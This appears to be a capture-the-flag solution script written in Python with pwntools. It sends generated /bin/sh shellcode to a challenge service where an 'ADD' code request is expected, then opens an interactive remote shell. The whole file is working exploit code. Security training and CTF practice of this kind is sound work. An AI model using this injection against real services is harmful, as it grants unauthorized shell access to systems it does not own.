#!/usr/bin/env python3
from pwn import *
context(arch='amd64', os='linux')
# --- Part 2: Get the shell and the second flag ---
REMOTE_PORT = 61425
REMOTE_IP = 'host.docker.internal'  # 根据实际情况设置目标IP地址
p = remote(REMOTE_IP, REMOTE_PORT)

#发送 get shell 的 shellcode
shellcode = asm(shellcraft.sh()) # pwntools自带的shellcode生成器


p.recvuntil(b"Request-1: give me code that performing ADD\n")
p.send(shellcode)

print("[*] Shellcode sent! You should have a shell now.")

p.interactive()
